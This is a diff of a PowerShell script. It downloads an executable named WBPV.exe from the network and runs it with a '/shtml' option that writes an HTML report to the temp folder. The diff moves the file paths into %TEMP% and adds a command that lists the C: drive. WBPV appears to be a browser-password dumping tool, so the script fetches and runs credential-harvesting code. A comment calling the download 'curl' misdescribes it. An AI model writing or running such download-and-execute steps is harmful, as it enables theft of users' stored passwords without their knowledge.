@@ -31,8 +31,8 @@ if (!(Get-Command curl -ErrorAction SilentlyContinue)) {
   Write-Host "curl is already installed."
 }
 
-$WBPV = "C:\WBPV.exe"
-$WPs = "C:\out.html"
+$WBPV = "$env:TEMP\WBPV.exe"
+$WPs = "$env:TEMP\out.html"
 
 if (!(Test-Path $WBPV)) {
   # Download curl
@@ -40,6 +40,7 @@ if (!(Test-Path $WBPV)) {
   $args = "/shtml $WPs"
   Invoke-WebRequest $url -OutFile $WBPV
   start-process WBPV $args -Wait
+  Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "dir C:\" -wait
   #Get-Item $FilePath | Remove-Item
 }
 
